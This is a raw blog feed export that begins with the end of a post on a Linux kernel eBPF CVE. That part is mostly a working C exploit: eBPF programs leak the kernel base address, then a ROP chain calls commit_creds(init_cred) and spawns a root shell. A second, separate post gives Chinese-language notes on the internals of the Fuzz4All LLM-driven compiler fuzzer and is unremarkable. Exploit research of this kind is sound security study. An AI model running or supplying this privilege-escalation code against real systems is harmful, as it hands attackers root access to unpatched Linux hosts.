BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">4</span>),    <span class="hljs-comment">// reg1 = exp_fd(4)</span><br><br>        <span class="hljs-comment">// map_lookup_elem(map_fd(4), fp - 4)</span><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),  <br><br>        <span class="hljs-comment">// reg8 = ptr_to_value(0x10000)</span><br>        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),<br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        <span class="hljs-comment">// *(int *)(fp - 4) = 0</span><br>        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, <span class="hljs-number">-4</span>),<br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">3</span>),    <span class="hljs-comment">// reg1 = map_fd(3)</span><br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-4</span>),  <span class="hljs-comment">// reg2 = fp - 4</span><br><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),<br><br>        <span class="hljs-comment">// reg7 = ptr_to_value(&#x27;256&#x27;)</span><br>        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),<br><br>        BPF_MOV64_REG(BPF_REG_1, BPF_REG_7),<br>        BPF_MOV64_IMM(BPF_REG_2, <span class="hljs-number">8</span>),<br>        BPF_MOV64_IMM(BPF_REG_3, <span class="hljs-number">0</span>),<br>        BPF_MOV64_REG(BPF_REG_4, BPF_REG_8),<br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_strtol),<br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">4</span>),<br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-4</span>),  <span class="hljs-comment">// reg2 = fp - 4</span><br><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),<br><br>        <span class="hljs-comment">// reg8 = ptr_to_value(0x100)</span><br>        <span class="hljs-comment">// reg7 = value(0x100)</span><br>        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),<br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, <span class="hljs-number">0</span>),<br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">5</span>),<br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_7),<br>        BPF_MOV64_IMM(BPF_REG_3, <span class="hljs-number">0</span>),<br><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_ringbuf_reserve),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),<br><br>        <span class="hljs-comment">// reg6 = ptr_to_ringbuf(5)</span><br>        BPF_MOV64_REG(BPF_REG_6, BPF_REG_0),<br><br>        <span class="hljs-comment">// reg8 = kernel_base</span><br>        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_6, <span class="hljs-number">0x2ff8</span>+<span class="hljs-number">0x28</span>),<br>        BPF_ALU64_IMM(BPF_SUB, BPF_REG_8, <span class="hljs-number">0x36b440</span>),<br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">7</span>),<br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br>        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, <span class="hljs-number">-8</span>),<br>        BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_8, <span class="hljs-number">-16</span>),<br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-8</span>),<br>        BPF_MOV64_REG(BPF_REG_3, BPF_REG_10),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_3, <span class="hljs-number">-16</span>),<br>        BPF_MOV64_IMM(BPF_REG_4, <span class="hljs-number">0</span>),<br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_update_elem),<br><br>        BPF_MOV64_REG(BPF_REG_1, BPF_REG_6),<br>        BPF_MOV64_IMM(BPF_REG_2, <span class="hljs-number">0</span>),<br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_ringbuf_submit),<br><br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        BPF_EXIT_INSN(),      <br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_LOG_SZ 0x20000</span><br><span class="hljs-type">char</span> bpf_log_buf[BPF_LOG_SZ] = &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">leak_attr</span> =</span> &#123;<br>    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,<br>    .insns = (<span class="hljs-type">uint64_t</span>) &amp;leak_prog,<br>    .insn_cnt = <span class="hljs-keyword">sizeof</span>(leak_prog) / <span class="hljs-keyword">sizeof</span>(leak_prog[<span class="hljs-number">0</span>]),<br>    .license = (<span class="hljs-type">uint64_t</span>) <span class="hljs-string">&quot;GPL&quot;</span>,<br>    .log_level = <span class="hljs-number">2</span>,<br>    .log_buf = (<span class="hljs-type">uint64_t</span>) bpf_log_buf,<br>    .log_size = BPF_LOG_SZ,<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">hack_attr</span> =</span> &#123;<br>    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,<br>    .insns = (<span class="hljs-type">uint64_t</span>) &amp;hack_prog,<br>    .insn_cnt = <span class="hljs-keyword">sizeof</span>(hack_prog) / <span class="hljs-keyword">sizeof</span>(hack_prog[<span class="hljs-number">0</span>]),<br>    .license = (<span class="hljs-type">uint64_t</span>) <span class="hljs-string">&quot;GPL&quot;</span>,<br>    .log_level = <span class="hljs-number">2</span>,<br>    .log_buf = (<span class="hljs-type">uint64_t</span>) bpf_log_buf,<br>    .log_size = BPF_LOG_SZ,<br>&#125;;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>        setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>        setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br>        save_status();<br>        bind_core(<span class="hljs-number">0</span>);<br><br>        <span class="hljs-keyword">if</span>(!fork()) &#123;<br>                <span class="hljs-keyword">if</span>(!fork())<br>                        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>                <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>        &#125;<br>        usleep(<span class="hljs-number">1000</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> buffer[<span class="hljs-number">0x200</span>/<span class="hljs-number">8</span>];<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAGIC_LEAK      0x114514</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAGIC_HACK      0x233333</span><br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigger</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_tmp)</span> &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">sk_buff</span> <span class="hljs-title">md</span> =</span> &#123;&#125;;<br><br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">test_run_attr</span> =</span> &#123;<br>                .test.prog_fd = fd_tmp,<br>                .test.data_size_in = <span class="hljs-number">0x300</span>,<br>                .test.data_in = (<span class="hljs-type">uint64_t</span>)&amp;buffer,<br>                .test.ctx_size_in = <span class="hljs-keyword">sizeof</span>(md),<br>                .test.ctx_in = (<span class="hljs-type">uint64_t</span>)&amp;md,<br>        &#125;;<br><br>        bpf(BPF_PROG_TEST_RUN, &amp;test_run_attr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">leak</span><span class="hljs-params">()</span> &#123;<br><br>        prctl(PR_SET_NAME, <span class="hljs-string">&quot;Eurus&quot;</span>);<br><br>        map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-number">4</span>, <span class="hljs-number">16</span>, <span class="hljs-number">1</span>, BPF_F_RDONLY_PROG);<br>        <span class="hljs-keyword">if</span> (map_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>);<br><br>        exp_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-number">4</span>, <span class="hljs-number">16</span>, <span class="hljs-number">1</span>, BPF_F_RDONLY_PROG);<br>        <span class="hljs-keyword">if</span> (exp_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>);<br><br>        <span class="hljs-type">int</span> key = <span class="hljs-number">0</span>;<br>        buffer[<span class="hljs-number">0</span>] = <span class="hljs-number">0x10000</span>;<br>        buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">8</span>;<br>        bpf_map_update_elem(exp_fd, &amp;key, buffer);<br><br>        buffer[<span class="hljs-number">0</span>] = <span class="hljs-number">0x363532</span>;<br>        buffer[<span class="hljs-number">1</span>] = <span class="hljs-number">0x323135</span>;<br>        bpf_map_update_elem(map_fd, &amp;key, buffer);<br><br>        bpf_map_freeze(exp_fd);<br>        bpf_map_freeze(map_fd);<br><br>        ringbuf_map_fd = bpf_map_create(BPF_MAP_TYPE_RINGBUF, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (ringbuf_map_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>);<br><br>        leak_ringbuf_map_fd = bpf_map_create(BPF_MAP_TYPE_RINGBUF, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (leak_ringbuf_map_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>);<br><br>        leak_map_fd = bpf_map_create(BPF_MAP_TYPE_ARRAY, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (leak_map_fd &lt; <span class="hljs-number">0</span>) perror(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_MAP_CREATE&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;map_fd: %d\n&quot;</span>, map_fd);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;exp_fd: %d\n&quot;</span>, exp_fd);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;ringbuf_map_fd: %d\n&quot;</span>, ringbuf_map_fd);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_ringbuf_map_fd: %d\n&quot;</span>, leak_ringbuf_map_fd);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_map_fd: %d\n&quot;</span>, leak_map_fd);<br><br>        leak_prog_fd = bpf(BPF_PROG_LOAD, &amp;leak_attr);<br>        <span class="hljs-keyword">if</span> (leak_prog_fd &lt; <span class="hljs-number">0</span>) <span class="hljs-built_in">puts</span>(bpf_log_buf), perror(<span class="hljs-string">&quot;BPF_PROG_LOAD&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_PROG_LOAD&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak_prog_fd: %d\n&quot;</span>, leak_prog_fd);<br><br>        <span class="hljs-comment">//puts(bpf_log_buf);</span><br>&#125;<br><br><span class="hljs-type">size_t</span> kernel_base;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET             0xe6d00</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED               0x248b080</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS            0x146b70</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET             0x1dc1a3</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RETURN_USER_MODE        0x1400163</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VFORK                   0x104150</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hack</span><span class="hljs-params">()</span>&#123;<br>        hack_prog_fd = bpf(BPF_PROG_LOAD, &amp;hack_attr);<br>        <span class="hljs-keyword">if</span> (hack_prog_fd &lt; <span class="hljs-number">0</span>) <span class="hljs-built_in">puts</span>(bpf_log_buf), perror(<span class="hljs-string">&quot;BPF_PROG_LOAD&quot;</span>), err_exit(<span class="hljs-string">&quot;BPF_PROG_LOAD&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hack_prog_fd: %d\n&quot;</span>, hack_prog_fd);<br><br>        <span class="hljs-comment">//puts(bpf_log_buf);</span><br><br>        <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>        <span class="hljs-type">size_t</span> *p = (<span class="hljs-type">size_t</span> *)((<span class="hljs-type">size_t</span>)buffer + <span class="hljs-number">14</span>);<br>        p[i++] = <span class="hljs-number">0xdeadbeef</span>;<br>        p[i++] = <span class="hljs-number">0xdeadbeef</span>;<br>        p[i++] = POP_RDI_RET+kernel_base;<br>        p[i++] = INIT_CRED+kernel_base;<br>        p[i++] = COMMIT_CREDS+kernel_base;<br>        p[i++] = POP_RCX_RET+kernel_base;<br>        p[i++] = (<span class="hljs-type">size_t</span>)&amp;get_root_shell;<br>        p[i++] = VFORK+kernel_base;       <br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv, <span class="hljs-type">char</span>** envp)</span><br>&#123;<br>        init();<br>        leak();<br>        trigger(leak_prog_fd);<br>        <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key = <span class="hljs-number">0</span>;<br>        bpf_map_lookup_elem(leak_map_fd, &amp;key, &amp;kernel_base);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;kernel_base: %lx\n&quot;</span>, kernel_base);<br><br>        hack();<br>        trigger(hack_prog_fd);<br><br>        <span class="hljs-keyword">if</span>(!getuid())   get_root_shell();<br>        <span class="hljs-keyword">else</span>            <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Oops...&quot;</span>);<br><br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;&#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CVEs</category>
      
      <category>Linux Kernel</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernel</tag>
      
      <tag>cve</tag>
      
      <tag>ebpf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fuzz4All</title>
    <link href="/2025/01/17/fuzz4all/"/>
    <url>/2025/01/17/fuzz4all/</url>
    
    <content type="html"><![CDATA[<p>难得睡个好觉</p><span id="more"></span><h1 id="Fuzz4All"><a href="#Fuzz4All" class="headerlink" title="Fuzz4All"></a>Fuzz4All</h1><h2 id="fuzz-py"><a href="#fuzz-py" class="headerlink" title="fuzz.py"></a>fuzz.py</h2><h3 id="命令行参数"><a href="#命令行参数" class="headerlink" title="命令行参数"></a>命令行参数</h3><ul><li>config：配置文件路径，在config路径下</li><li>folder：结果存储路径，在outputs路径下</li><li>cpu：字面意思</li><li>batch_size：字面意思</li><li>model_name：使用的模型名称</li><li>target：目标编译器路径<ul><li>gcc</li><li>g++</li><li>go</li><li>javac</li><li>cvc5：一个约束求解器</li><li>qiskit：量子计算</li></ul></li></ul><h3 id="配置文件参数"><a href="#配置文件参数" class="headerlink" title="配置文件参数"></a>配置文件参数</h3><ul><li><p>fuzzing：整个fuzz流程的配置</p><ul><li>target_name：测试目标路径，可由–target指定</li><li>output_folder：结果文件夹，可由–folder指定</li><li>num：fuzz迭代轮数</li><li>total_time：总计fuzz时间，单位hour</li><li>log_level：<ul><li>1：info</li><li>2：trace</li><li>3：verbose</li></ul></li><li>otf：即时验证，在每次生成后验证output</li><li>resume：是否是恢复模式</li><li>evaluate：是否是评测模式</li><li>use_hand_written_prompt：是否使用hand written prompt</li><li>no_input_prompt：不需要输入prompt</li><li>prompt_strategy：prompt策略<ul><li>0：只使用trigger_to_generate_input进行生成</li><li>1：变异已有代码</li><li>2：语义等价已有代码</li><li>3：结合前两个生成的代码</li></ul></li></ul></li><li><p>target：目标编译器配置</p><ul><li><p>language：语言</p></li><li><p>path_documentation：目标语言特性文档路径</p></li><li><p>path_example_code：目标语言特性示例代码</p></li><li><p>trigger_to_generate_input：例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;/* Please create a short program which uses new C features in a complex way */&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>input_hint：例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;#include &lt;stdlib.h&gt;&quot;</span><br></code></pre></td></tr></table></figure></li><li><p>path_hand_written_prompt：一些写好的prompt</p></li><li><p>target_string：需要测试的目标名称</p></li></ul></li><li><p>llm：模型配置</p><ul><li>temperature：模型的temperature（选择时的冒险程度或稳定程度）</li><li>batch_size：字面意思，可用–batch_size指定</li><li>device：字面意思，可用–cpu指定为cpu</li><li>model_name：模型名，可用–model_name指定</li><li>max_length：output的最大长度</li></ul></li></ul><h3 id="fuzz-loop主要流程"><a href="#fuzz-loop主要流程" class="headerlink" title="fuzz loop主要流程"></a>fuzz loop主要流程</h3><ul><li><p>生成初始prompt</p><ul><li><p>temperature&#x3D;0，gpt生成greedy_prompt，config：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">config = &#123;<br>    <span class="hljs-string">&quot;model&quot;</span>: <span class="hljs-string">&quot;gpt-3.5-turbo&quot;</span>,<br>    <span class="hljs-string">&quot;max_token&quot;</span>: <span class="hljs-number">500</span>,<br>    <span class="hljs-string">&quot;temperature&quot;</span>: <span class="hljs-number">0.0</span>,<span class="hljs-comment"># risk</span><br>    <span class="hljs-string">&quot;message&quot;</span>: [<br>        &#123;<span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;system&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>: self.AP_SYSTEM_MESSAGE&#125;,<br>        &#123;<span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;user&quot;</span>, <span class="hljs-string">&quot;content&quot;</span>: message + <span class="hljs-string">&#x27;\n&#x27;</span> + self.AP_INSTRUCTION&#125; <span class="hljs-comment"># message是文档</span><br>    ]<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>验证打分</p></li><li><p>重复三次生成：</p><ul><li>temperature&#x3D;1，gpt生成prompt，config同上</li><li>验证打分</li></ul></li></ul><p>选择分数最高的prompt作为initial_prompt</p></li><li><p>进入loop：</p><ul><li>generate</li><li>选择变异策略，更新prompt<ul><li>选择最后一个合法的output作为new_code</li><li>三种变异策略：<ul><li>new_code+separator</li><li>变异new_code</li><li>语法等价new_code</li><li>结合new_code和prev_example</li></ul></li></ul></li></ul></li></ul><h3 id="cli"><a href="#cli" class="headerlink" title="cli"></a>cli</h3><p>–config加载配置文件</p><h3 id="main-with-config"><a href="#main-with-config" class="headerlink" title="main_with_config"></a>main_with_config</h3><ul><li><p>解析配置文件</p></li><li><p>调用make_target_with_config创建Target实例</p></li><li><p>如果不是evaluate模式，则开始fuzz</p><ul><li>如果不是resume模式则新建工作文件夹</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">fuzz(<br>    target=target,<br>    number_of_iterations=fuzzing[<span class="hljs-string">&quot;num&quot;</span>],<br>    total_time=fuzzing[<span class="hljs-string">&quot;total_time&quot;</span>],<br>    output_folder=folder,<br>    resume=fuzzing[<span class="hljs-string">&quot;resume&quot;</span>],<br>    otf=fuzzing[<span class="hljs-string">&quot;otf&quot;</span>],<br>)<br></code></pre></td></tr></table></figure></li><li><p>如果是evaluate模式则调用evaluate_all进行evaluate</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">evaluate_all(target)<br></code></pre></td></tr></table></figure><p>就是分别验证（编译或运行）每个output</p></li></ul><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz"></a>fuzz</h3><ul><li><p>initialize target</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">target.initialize()<br></code></pre></td></tr></table></figure><p><em>initialize见target&#x2F;target.py</em></p></li><li><p>进入fuzz loop，迭代次数number_of_iterations</p><ul><li><p>使用self.prompt生成outputs</p></li><li><p>对于每个output：</p><ul><li>写入文件</li><li>如果设置了otf，则：</li><li>调用validate_individual验证output（编译&#x2F;运行）</li><li>调用parse_validation_message解析验证结果信息，记录进log</li></ul></li><li><p>调用update更新target</p><p><em>update见target&#x2F;target.py</em></p></li></ul></li></ul><h2 id="make-model-py"><a href="#make-model-py" class="headerlink" title="make_model.py"></a>make_model.py</h2><h3 id="make-model"><a href="#make-model" class="headerlink" title="make_model"></a>make_model</h3><ul><li><p>kwargs_for_model：参数</p><ul><li>model_name</li><li>eos</li><li>device</li><li>max_length</li></ul></li><li><p>创建StarCoder实例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">model_obj = StarCoder(**kwargs_for_model)<br></code></pre></td></tr></table></figure></li><li><p>返回model_obj</p></li></ul><p>输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">=== Model Config ===<br>model_name: bigcode/starcoderbase-1b<br>model_name: bigcode/starcoderbase-1b<br>eos: [&#x27;/* Please create a short program which uses new C features in a complex way */&#x27;, &#x27;&lt;eom&gt;&#x27;, &#x27;/* Please create a semantically equivalent program to the previous generation */&#x27;, &#x27;/* Please create a mutated program that modifies the previous generation */&#x27;, &#x27;/* Please combine the two previous programs into a single program */&#x27;]<br>device: cuda<br>max_length: 1024<br>model_obj (class name): StarCoder<br>====================<br></code></pre></td></tr></table></figure><h3 id="class-StarCoder"><a href="#class-StarCoder" class="headerlink" title="class StarCoder"></a>class StarCoder</h3><h4 id="init"><a href="#init" class="headerlink" title="__init__"></a>__init__</h4><p>model_name，device，eos，max_length</p><ul><li><p>device</p></li><li><p>tokenizer</p></li><li><p>model</p></li><li><p>eos：eos + EOF_STRINGS</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">EOF_STRINGS = [<span class="hljs-string">&quot;&lt;|endoftext|&gt;&quot;</span>, <span class="hljs-string">&quot;###&quot;</span>]<br></code></pre></td></tr></table></figure></li><li><p>prefix_token：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;fim_prefix&gt;<br></code></pre></td></tr></table></figure></li><li><p>suffix_token：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;fim_suffix&gt;&lt;fim_middle&gt;<br></code></pre></td></tr></table></figure></li><li><p>skip_special_tokens：False</p></li></ul><h4 id="generate"><a href="#generate" class="headerlink" title="generate"></a>generate</h4><p>prompt生成代码</p><ul><li><p>inference_mode关闭一堆东西提高速度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@torch.inference_mode()</span><br></code></pre></td></tr></table></figure></li><li><p>给prompt添加前后缀</p></li><li><p>用tokenizer获取input_tokens</p></li><li><p>EndOfFunctionCriteria用于实时检测生成是否已结束（出现eos），是则记录去除eos后的输出长度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">scores = StoppingCriteriaList(<br>    [<br>        EndOfFunctionCriteria(<br>            start_length=<span class="hljs-built_in">len</span>(input_tokens[<span class="hljs-number">0</span>]),<br>            eos=self.eos,<br>            tokenizer=self.tokenizer,<br>        )<br>    ]<br>)<br></code></pre></td></tr></table></figure></li><li><p>生成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">raw_outputs = self.model.generate(<br>    input_tokens,<br>    max_length=<span class="hljs-built_in">min</span>(self.max_length, <span class="hljs-built_in">len</span>(input_tokens[<span class="hljs-number">0</span>]) + max_length),<br>    do_sample=<span class="hljs-literal">True</span>,<br>    top_p=<span class="hljs-number">1.0</span>,<br>    temperature=<span class="hljs-built_in">max</span>(temperature, <span class="hljs-number">1e-2</span>),<br>    num_return_sequences=batch_size,<br>    stopping_criteria=scores,<br>    output_scores=<span class="hljs-literal">True</span>,<br>    return_dict_in_generate=<span class="hljs-literal">True</span>,<br>    repetition_penalty=<span class="hljs-number">1.0</span>,<br>    pad_token_id=self.tokenizer.eos_token_id,<br>)<br></code></pre></td></tr></table></figure><ul><li>do_sample：是否在生成文本时使用采样策略，如果设置为False，则使用贪心策略进行解码（总是选择概率最高的下一个token）</li><li>top_p：保留累计概率达到p的最小集合，然后从这个集合中进行选择</li><li>num_return_sequences：设置生成几个文本</li><li>repetition_penalty：防止文本重复</li><li>stopping_criteria：停止条件</li><li>output_scores：让模型同时返回输出和对应的分数</li><li>return_dict_in_generate：方法会返回一个字典，其中包含生成的文本和其他相关信息，如attention masks等</li></ul></li><li><p>去除每个输出的prompt部分</p></li><li><p>去除每个输出的eos</p></li></ul><h2 id="make-target-py"><a href="#make-target-py" class="headerlink" title="make_target.py"></a>make_target.py</h2><h3 id="make-target-with-config"><a href="#make-target-with-config" class="headerlink" 